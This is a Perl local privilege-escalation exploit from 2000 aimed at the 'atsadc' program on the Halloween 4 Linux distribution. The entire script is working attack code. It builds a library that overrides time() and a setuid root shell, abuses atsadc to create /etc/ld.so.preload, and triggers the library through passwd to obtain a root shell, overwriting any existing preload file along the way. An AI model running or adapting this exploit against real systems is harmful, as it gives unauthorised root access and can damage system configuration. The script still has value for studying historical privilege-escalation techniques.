#!/usr/bin/perl

# Halloween 4 local root-exploit, other distros are maybe
# affected as well. (atsadc program)
# (C) 2000 C-skills development, S. Krahmer under the GPL
# http://www.cs.uni-potsdam.de/homepages/students/linuxer

# Exploit will create /etc/ld.so.preload, so it should NOT exist
# already. THIS FILE WILL BE LOST!

# ! USE IT AT YOUR OWN RISK !
# For educational purposes only.

print "Creating hijack-lib ...\n";
open O, ">/tmp/boom.c" or die "open(boom.c..)";
print O<<_EOF_;
#include <sys/types.h>

int time(void *v)
{
	chown("/tmp/boomsh", 0, 0);
	chmod("/tmp/boomsh", 06755);
	unlink("/etc/ld.so.preload");
	exit(1);
}
_EOF_
close O;

print "Compiling hijack-lib ...\n";
$foo = `cc -c -fPIC /tmp/boom.c -o /tmp/boom.o`;
$foo = `cc -shared /tmp/boom.o -o /tmp/boom.so`;

open O, ">/tmp/boomsh.c" or die "open(boomsh.c ...)";
print O<<_EOF2_;
#include <stdio.h>
int main() 
{
    char *a[] = {"/bin/sh", 0};
    setuid(0); setregid(0, 0);
    execve(a[0], a, 0);
    return 0;
}
_EOF2_
close O;

print "Compile shell ...\n";
$foo = `cc /tmp/boomsh.c -o /tmp/boomsh`;

umask 0;

print "Invoking vulnerable program (atsadc)...\n";
$foo = `atsadc 2 1 /etc/ld.so.preload`;
open O, ">/etc/ld.so.preload" or die "Huh? Can't open preload.";
print O "/tmp/boom.so";
close O;
$foo = `/usr/bin/passwd`;

# let it look like if we have sth. to do. :)
sleep 3;
print "Welcome. But as always: BEHAVE!\n";
system("/tmp/boomsh");
